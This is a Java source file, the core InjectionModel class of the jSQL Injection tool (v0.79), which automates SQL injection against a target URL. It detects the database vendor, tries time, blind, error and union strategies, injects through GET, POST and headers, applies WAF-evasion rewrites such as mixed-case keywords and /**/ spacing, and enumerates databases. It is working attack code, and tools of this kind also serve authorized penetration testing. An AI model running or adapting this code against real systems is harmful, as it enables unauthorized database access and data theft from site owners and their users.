/*******************************************************************************
 * Copyhacked (H) 2012-2016.
 * This program and the accompanying materials
 * are made available under no term at all, use it like
 * you want, but share and discuss about it
 * every time possible with every body.
 * 
 * Contributors:
 *      ron190 at ymail dot com - initial implementation
 ******************************************************************************/
package com.jsql.model;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.charset.Charset;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.PrivilegedActionException;
import java.util.EnumMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javax.security.auth.login.LoginException;

import org.apache.commons.lang3.StringUtils;
import org.apache.log4j.Logger;
import org.ietf.jgss.GSSException;

import com.jsql.model.accessible.DataAccess;
import com.jsql.model.accessible.RessourceAccess;
import com.jsql.model.bean.util.Request;
import com.jsql.model.bean.util.TypeHeader;
import com.jsql.model.bean.util.TypeRequest;
import com.jsql.model.exception.IgnoreMessageException;
import com.jsql.model.exception.InjectionFailureException;
import com.jsql.model.exception.JSqlException;
import com.jsql.model.injection.method.MethodInjection;
import com.jsql.model.injection.strategy.StrategyInjection;
import com.jsql.model.injection.strategy.StrategyInjectionNormal;
import com.jsql.model.injection.vendor.Vendor;
import com.jsql.model.suspendable.SuspendableGetCharInsertion;
import com.jsql.model.suspendable.SuspendableGetVendor;
import com.jsql.util.AuthenticationUtil;
import com.jsql.util.ConnectionUtil;
import com.jsql.util.GitUtil.ShowOnConsole;
import com.jsql.util.PreferencesUtil;
import com.jsql.util.ProxyUtil;
import com.jsql.util.ThreadUtil;

import net.sourceforge.spnego.SpnegoHttpURLConnection;

/**
 * Model class of MVC pattern for processing SQL injection automatically.<br>
 * Different views can be attached to this observable, like Swing or command line, in order to separate
 * the functional job from the graphical processing.<br>
 * The Model has a specific database vendor and strategy which run an automatic injection to get name of
 * databases, tables, columns and values, and it can also retreive resources like files and shell.<br>
 * Tasks are run in multi-threads in general to speed the process.
 */
public class InjectionModel extends AbstractModelObservable {
	
    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = Logger.getRootLogger();
    
    /**
     * Current version of application.
     */
    private static final String VERSION_JSQL = "0.79";
    
    /**
     * i.e, -1 in "[..].php?id=-1 union select[..]"
     */
    private String charInsertion;
    
    /**
     * HTML source of page successfully responding to
     * multiple fields selection (select 1,2,3,..).
     */
    private String srcSuccess = "";
    
    /**
     * initialUrl transformed to a correct injection url.
     */
    private String indexesInUrl;

    /**
     * Current version of database.
     */
    private String versionDatabase;
    
    /**
     * Selected database.
     */
    private String nameDatabase;
    
    /**
     * User connected to database.
     */
    private String username;
    
    /**
     * Database vendor currently used.
     * It can be switched to another vendor by automatic detection or manual selection.
     */
    private Vendor vendor = Vendor.MYSQL;

    /**
     * Database vendor selected by user (default UNDEFINED).
     * If not UNDEFINED then the next injection will be forced to use the selected vendor.
     */
    private Vendor vendorByUser = Vendor.AUTO;
    
    /**
     * Current injection strategy.
     */
    private StrategyInjection strategy;
    
    /**
     * Allow to directly start an injection after a failed one
     * without asking the user 'Start a new injection?'.
     */
    private boolean injectionAlreadyBuilt = false;
    
    private boolean isScanning = false;

    /**
     * Current evasion step, 0 is 'no evasion'
     */
    private int stepSecurity = 0;
    
    public void resetModel() {
        this.charInsertion = null;
        ((StrategyInjectionNormal) StrategyInjection.NORMAL.instance()).setVisibleIndex(null);
        this.indexesInUrl = null;
        
        this.versionDatabase = null;
        this.nameDatabase = null;
        this.username = null;
        
        this.setIsStoppedByUser(false);
        this.injectionAlreadyBuilt = false;
        
        this.strategy = null;
        
        RessourceAccess.setReadingIsAllowed(false);
        
        ThreadUtil.reset();
    }

    /**
     * Prepare the injection process, can be interrupted by the user (via shouldStopAll).
     * Erase all attributes eventually defined in a previous injection.
     */
    public void beginInjection() {
        this.resetModel();
        
        if (!ProxyUtil.proxyIsResponding(ShowOnConsole.YES)) {
            return;
        }
        
        LOGGER.info("Starting new injection");
        LOGGER.trace("Connection test...");
        
        try {
            ConnectionUtil.testConnection();
            
            // TODO separate method
            // Define insertionCharacter, i.e, -1 in "[..].php?id=-1 union select[..]",
            LOGGER.trace("Get insertion character...");
            
            this.charInsertion = new SuspendableGetCharInsertion().run();
            LOGGER.info("Using insertion character in Url ["+ this.charInsertion +"]");
            
            // TODO separate method
            this.vendor = new SuspendableGetVendor().run();
            
            if (this.vendor == null) {
                this.vendor = Vendor.MYSQL;
                LOGGER.info("Type of database undefined, forcing to ["+ this.vendor +"]");
            } else {
                LOGGER.info("Using database type ["+ this.vendor +"]");
                
                Map<TypeHeader, Object> msgHeader = new EnumMap<>(TypeHeader.class);
                msgHeader.put(TypeHeader.URL, ConnectionUtil.getUrlBase() + ConnectionUtil.getQueryString() + this.charInsertion);
                msgHeader.put(TypeHeader.VENDOR, this.vendor);
                
                Request requestDatabaseIdentified = new Request();
                requestDatabaseIdentified.setMessage(TypeRequest.DATABASE_IDENTIFIED);
                requestDatabaseIdentified.setParameters(msgHeader);
                this.sendToViews(requestDatabaseIdentified);
            }
            
            Request requestSetVendor = new Request();
            requestSetVendor.setMessage(TypeRequest.SET_VENDOR);
            requestSetVendor.setParameters(this.vendor);
            this.sendToViews(requestSetVendor);

            // Test each injection methods: time, blind, error, normal
            // TODO separate method
            StrategyInjection.TIME.instance().checkApplicability();
            StrategyInjection.BLIND.instance().checkApplicability();
            StrategyInjection.ERROR.instance().checkApplicability();
            StrategyInjection.NORMAL.instance().checkApplicability();

            // Choose the most efficient method: normal > error > blind > time
            // TODO separate method
            if (StrategyInjection.NORMAL.instance().isApplicable()) {
                StrategyInjection.NORMAL.instance().activateStrategy();
                
            } else if (StrategyInjection.ERROR.instance().isApplicable()) {
                StrategyInjection.ERROR.instance().activateStrategy();
                
            } else if (StrategyInjection.BLIND.instance().isApplicable()) {
                StrategyInjection.BLIND.instance().activateStrategy();
                
            } else if (StrategyInjection.TIME.instance().isApplicable()) {
                StrategyInjection.TIME.instance().activateStrategy();
                
            } else if (PreferencesUtil.isEvasionEnabled() && this.stepSecurity < 3) {
                // No injection possible, increase evasion level and restart whole process
                this.stepSecurity++;

                LOGGER.warn("Injection failed, testing evasion level "+ this.stepSecurity +"...");
                
                Request request = new Request();
                request.setMessage(TypeRequest.RESET_STRATEGY_LABEL);
                this.sendToViews(request);
                
                // sinon perte de insertionCharacter entre 2 injections
                ConnectionUtil.setQueryString(ConnectionUtil.getQueryString() + this.charInsertion);
                this.beginInjection();
                
                return;
            } else {
                throw new InjectionFailureException("No injection found");
            }

            if (!this.isScanning) {
                DataAccess.getDatabaseInfos();
                DataAccess.listDatabases();
            }
            
            LOGGER.trace("Done");
            this.injectionAlreadyBuilt = true;
        } catch (JSqlException e) {
            LOGGER.warn(e.getMessage(), e);
        } finally {
            Request request = new Request();
            request.setMessage(TypeRequest.END_PREPARATION);
            this.sendToViews(request);
        }
    }
    
    /**
     * Run a HTTP connection to the web server.
     * @param dataInjection SQL query
     * @param responseHeader unused
     * @return source code of current page
     */
    @Override
    public String inject(String newDataInjection, boolean isUsingIndex) {
        // Temporary url, we go from "select 1,2,3,4..." to "select 1,([complex query]),2...", but keep initial url
        String urlInjection = ConnectionUtil.getUrlBase();
        
        String dataInjection = newDataInjection;
        
        urlInjection = this.buildURL(urlInjection, isUsingIndex, dataInjection);

        urlInjection = urlInjection
            .trim()
            // Remove comments
            .replaceAll("(?s)/\\*.*?\\*/", "")
            // Remove spaces after a word
            .replaceAll("([^\\s\\w])(\\s+)", "$1")
            // Remove spaces before a word
            .replaceAll("(\\s+)([^\\s\\w])", "$2")
            // Replace spaces
            .replaceAll("\\s+", "+")
            /*// Add ending line comment, except for INGRES
            +(this.vendor != Vendor.INGRES ? "--+" : "")*/;

        URL urlObject = null;
        try {
            urlObject = new URL(urlInjection);
        } catch (MalformedURLException e) {
            LOGGER.warn("Incorrect Query Url: "+ e.getMessage(), e);
            return "";
        }

        /**
         * Build the GET query string infos
         * Add primary evasion
         * TODO separate method
         */
        if (ConnectionUtil.getQueryString() != null && !"".equals(ConnectionUtil.getQueryString())) {
            urlInjection += this.buildQuery(MethodInjection.QUERY, ConnectionUtil.getQueryString(), isUsingIndex, dataInjection);
            try {
                // Evasion
                if (this.stepSecurity == 1) {
                    // Replace character '+'
                    urlInjection = urlInjection
                        .replaceAll("--\\+", "--")
                        .replaceAll("7330%2b1", "7331");
                    
                } else if (this.stepSecurity == 2) {
                    // Change case
                    urlInjection = urlInjection
                        .replaceAll("union\\+", "uNiOn+")
                        .replaceAll("select\\+", "sElEcT+")
                        .replaceAll("from\\+", "FrOm+")
                        .replaceAll("from\\(", "FrOm(")
                        .replaceAll("where\\+", "wHeRe+")
                        .replaceAll("([AE])=0x", "$1+lIkE+0x");
                    
                } else if (this.stepSecurity == 3) {
                    // Change Case and Space
                    urlInjection = urlInjection
                        .replaceAll("union\\+", "uNiOn/**/")
                        .replaceAll("select\\+", "sElEcT/**/")
                        .replaceAll("from\\+", "FrOm/**/")
                        .replaceAll("from\\(", "FrOm(")
                        .replaceAll("where\\+", "wHeRe/**/")
                        .replaceAll("([AE])=0x", "$1/**/lIkE/**/0x");
                    urlInjection = urlInjection
                        .replaceAll("--\\+", "--")
                        .replaceAll("\\+", "/**/");
                }

                urlObject = new URL(urlInjection);
            } catch (MalformedURLException e) {
                LOGGER.warn("Incorrect Evasion Url: "+ e.getMessage(), e);
            }
        }
        
        HttpURLConnection connection;
        String pageSource = "";
        
        // Define the connection
        try {
            
            // TODO separate method
            // Block Opening Connection
            if (AuthenticationUtil.isKerberos()) {
                String kerberosConfiguration =
                    Pattern
                        .compile("(?s)\\{.*")
                        .matcher(StringUtils.join(Files.readAllLines(Paths.get(AuthenticationUtil.getPathKerberosLogin()), Charset.defaultCharset()), ""))
                        .replaceAll("")
                        .trim();
                
                SpnegoHttpURLConnection spnego = new SpnegoHttpURLConnection(kerberosConfiguration);
                connection = spnego.connect(urlObject);
            } else {
                connection = (HttpURLConnection) urlObject.openConnection();
            }
            
            connection.setReadTimeout(ConnectionUtil.TIMEOUT);
            connection.setConnectTimeout(ConnectionUtil.TIMEOUT);
            connection.setDefaultUseCaches(false);
            
            connection.setRequestProperty("Pragma", "no-cache");
            connection.setRequestProperty("Cache-Control", "no-cache");
            connection.setRequestProperty("Expires", "-1");
            
            ConnectionUtil.fixJcifsTimeout(connection);

            Map<TypeHeader, Object> msgHeader = new EnumMap<>(TypeHeader.class);
            msgHeader.put(TypeHeader.URL, urlInjection);
            
            /**
             * Build the HEADER and logs infos
             * #Need primary evasion
             */
            if (!"".equals(ConnectionUtil.getHeader())) {
                for (String header: this.buildQuery(MethodInjection.HEADER, ConnectionUtil.getHeader(), isUsingIndex, dataInjection).split("\\\\r\\\\n")) {
                    ConnectionUtil.sanitizeHeaders(connection, header);
                }
                
                msgHeader.put(TypeHeader.HEADER, this.buildQuery(MethodInjection.HEADER, ConnectionUtil.getHeader(), isUsingIndex, dataInjection));
            }
    
            /**
             * Build the POST and logs infos
             * #Need primary evasion
             * TODO separate method
             */
            if (!"".equals(ConnectionUtil.getRequest())) {
                try {
                    ConnectionUtil.fixCustomRequestMethod(connection, ConnectionUtil.getTypeRequest());
                    
                    connection.setDoOutput(true);
                    connection.addRequestProperty("Content-Type", "application/x-www-form-urlencoded");
    
                    if (ConnectionUtil.getTypeRequest().matches("PUT|POST")) {
                        DataOutputStream dataOut = new DataOutputStream(connection.getOutputStream());
                        dataOut.writeBytes(this.buildQuery(MethodInjection.REQUEST, ConnectionUtil.getRequest(), isUsingIndex, dataInjection));
                        dataOut.flush();
                        dataOut.close();
                    }
                    
                    msgHeader.put(TypeHeader.POST, this.buildQuery(MethodInjection.REQUEST, ConnectionUtil.getRequest(), isUsingIndex, dataInjection));
                } catch (IOException e) {
                    LOGGER.warn("Error during Request connection: "+ e.getMessage(), e);
                }
            }
            
            msgHeader.put(TypeHeader.RESPONSE, ConnectionUtil.getHttpHeaders(connection));
    
            // Request the web page to the server
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
                char[] buffer = new char[4096];
                StringBuilder sb = new StringBuilder();
                while (reader.read(buffer) > 0) {
                    sb.append(buffer);
                }
                
                pageSource = sb.toString();
            } catch (IOException e) {
                // Ignore connection errors like 403, 406
                // Http status code already logged in Network tab

                // Ignore
                IgnoreMessageException exceptionIgnored = new IgnoreMessageException(e);
                LOGGER.trace(exceptionIgnored, exceptionIgnored);
            }
            
            // Disable caching of authentication like Kerberos
            // TODO worth the disconnection ?
//            connection.disconnect();
            
            msgHeader.put(TypeHeader.SOURCE, pageSource);
            
            // Inform the view about the log infos
            Request request = new Request();
            request.setMessage(TypeRequest.MESSAGE_HEADER);
            request.setParameters(msgHeader);
            this.sendToViews(request);
            
        } catch (
            // Exception for Block Opening Connection
            IOException | LoginException | GSSException | PrivilegedActionException e
        ) {
            LOGGER.warn("Error during connection: "+ e.getMessage(), e);
        }

        // return the source code of the page
        return pageSource;
    }
    
    /**
     * Build correct data for GET, POST, HEADER.<br>
     * Each can be:<br>
     *  - raw data (no injection)<br>
     *  - SQL query without index requirement<br>
     *  - SQL query with index requirement.
     * @param dataType Current method to build
     * @param paramLead Beginning of the request data
     * @param isUsingIndex False if request doesn't use indexes
     * @param sqlTrail SQL statement
     * @return Final data
     */
    private String buildURL(String paramLead, boolean isUsingIndex, String sqlTrail) {
        if (paramLead.contains("*")) {
            if (!isUsingIndex) {
                return paramLead.replace("*", sqlTrail);
            } else {
                return
                    paramLead.replace("*",
                        this.indexesInUrl.replaceAll(
                            "1337" + ((StrategyInjectionNormal) StrategyInjection.NORMAL.instance()).getVisibleIndex() + "7331",
                            /**
                             * Oracle column often contains $, which is reserved for regex.
                             * => need to be escape with quoteReplacement()
                             */
                            Matcher.quoteReplacement(sqlTrail)
                        )
                    )
                ;
            }
        }
        return paramLead;
    }
    
    private String buildQuery(MethodInjection methodInjection, String paramLead, boolean isUsingIndex, String sqlTrail) {
        String query;
        
        // TODO simplify
        if (ConnectionUtil.getMethodInjection() != methodInjection || ConnectionUtil.getUrlBase().contains("*")) {
            query = paramLead;
        } else if (paramLead.contains("*")) {
            if (!isUsingIndex) {
                query = paramLead.replace("*", sqlTrail);
            } else {
                query =
                    paramLead.replace("*",
                        this.indexesInUrl.replaceAll(
                            "1337" + ((StrategyInjectionNormal) StrategyInjection.NORMAL.instance()).getVisibleIndex() + "7331",
                            /**
                             * Oracle column often contains $, which is reserved for regex.
                             * => need to be escape with quoteReplacement()
                             */
                            Matcher.quoteReplacement(sqlTrail)
                        )
                    )
                ;
            }
        } else {
            if (!isUsingIndex) {
                query = paramLead + sqlTrail;
            } else {
                query =
                    paramLead
                    + this.indexesInUrl.replaceAll(
                        "1337" + ((StrategyInjectionNormal) StrategyInjection.NORMAL.instance()).getVisibleIndex() + "7331",
                        /**
                         * Oracle column often contains $, which is reserved for regex.
                         * => need to be escape with quoteReplacement()
                         */
                        Matcher.quoteReplacement(sqlTrail)
                    )
                ;
            }
        }
        
        query = query
            .trim()
            // Remove comments
            .replaceAll("(?s)/\\*.*?\\*/", "")
            // Remove spaces after a word
            .replaceAll("([^\\s\\w])(\\s+)", "$1")
            // Remove spaces before a word
            .replaceAll("(\\s+)([^\\s\\w])", "$2")
            // Replace spaces
            .replaceAll("\\s+", "+")
            // TODO Add ending line comment, except for INGRES
            +(
                this.vendor != Vendor.INGRES 
                ? this.vendor != Vendor.NEO4J 
                    ? "--+" 
                    : "//"
                : ""
            );
        
        return query;
    }
    
    /**
     * Display source code in console.
     * @param message Error message
     * @param source Text to display in console
     */
    public void sendResponseFromSite(String message, String source) {
        LOGGER.warn(message + ", response from site:");
        LOGGER.warn(">>>" + source);
    }

    /**
     * Send each parameters from the GUI to the model in order to
     * start the preparation of injection, the injection process is
     * started in a new thread via model function inputValidation().
     */
    public void controlInput(
        String urlQuery, String dataRequest, String dataHeader, MethodInjection methodInjection,
        String typeRequest, Boolean isScanning
    ) {
        try {
        	// TODO seperate method in ConnectionUtil
            URL url = new URL(urlQuery);
            if ("".equals(urlQuery) || "".equals(url.getHost())) {
                throw new MalformedURLException("empty URL");
            }
            
            ConnectionUtil.setUrlByUser(urlQuery);
            
            // Parse url and GET query string
            ConnectionUtil.setQueryString("");
            Matcher regexSearch = Pattern.compile("(.*)(\\?.*)").matcher(urlQuery);
            if (regexSearch.find()) {
                ConnectionUtil.setUrlBase(regexSearch.group(1));
                if (!"".equals(url.getQuery())) {
                    ConnectionUtil.setQueryString(regexSearch.group(2));
                }
            } else {
                ConnectionUtil.setUrlBase(urlQuery);
            }
            
            // Define other methods
            ConnectionUtil.setRequest(dataRequest);
            ConnectionUtil.setHeader(dataHeader);
            ConnectionUtil.setMethodInjection(methodInjection);
            ConnectionUtil.setTypeRequest(typeRequest);
            
            // Reset level of evasion
            this.stepSecurity = 0;
            
            // TODO separate method
            if (isScanning) {
                this.beginInjection();
            } else {
                // Start the model injection process in a thread
                new Thread(InjectionModel.this::beginInjection, "ThreadBeginInjection").start();
            }
        } catch (MalformedURLException e) {
            LOGGER.warn("Incorrect Url: "+ e.getMessage(), e);
            
            // Incorrect URL, reset the start button
            Request request = new Request();
            request.setMessage(TypeRequest.END_PREPARATION);
            this.sendToViews(request);
        }
    }
    
    public void displayVersion() {
        String versionJava = System.getProperty("java.version");
        String nameSystemArchitecture = System.getProperty("os.arch");
        LOGGER.trace(
            "jSQL Injection v" + VERSION_JSQL
            + " on Java "+ versionJava
            +"-"+ nameSystemArchitecture
            +"-"+ System.getProperty("user.language")
        );
    }
    
    public String getDatabaseInfos() {
        return
    		"Database ["+ this.nameDatabase +"] "
            + "on "+ this.vendor +" ["+ this.versionDatabase +"] "
            + "for user ["+ this.username +"]";
    }

    public void setDatabaseInfos(String versionDatabase, String nameDatabase, String username) {
        this.versionDatabase = versionDatabase;
        this.nameDatabase = nameDatabase;
        this.username = username;
    }
    
    // Getters and setters
    
    public Vendor getVendor() {
        return this.vendor;
    }

    public Vendor getVendorByUser() {
        return this.vendorByUser;
    }

    public void setVendorByUser(Vendor vendorByUser) {
        this.vendorByUser = vendorByUser;
    }
    
    public StrategyInjection getStrategy() {
    	return this.strategy;
    }

    public void setStrategy(StrategyInjection strategy) {
        this.strategy = strategy;
    }

    public String getCharInsertion() {
        return this.charInsertion;
    }

    public String getSrcSuccess() {
        return this.srcSuccess;
    }

    public void setSrcSuccess(String srcSuccess) {
        this.srcSuccess = srcSuccess;
    }

    public String getIndexesInUrl() {
        return this.indexesInUrl;
    }

    public void setIndexesInUrl(String indexesInUrl) {
        this.indexesInUrl = indexesInUrl;
    }

    public boolean isInjectionAlreadyBuilt() {
        return this.injectionAlreadyBuilt;
    }

    public void setIsScanning(boolean isScanning) {
        this.isScanning = isScanning;
    }

    public static String getVersionJsql() {
        return VERSION_JSQL;
    }

    public int getStepSecurity() {
        return this.stepSecurity;
    }

}
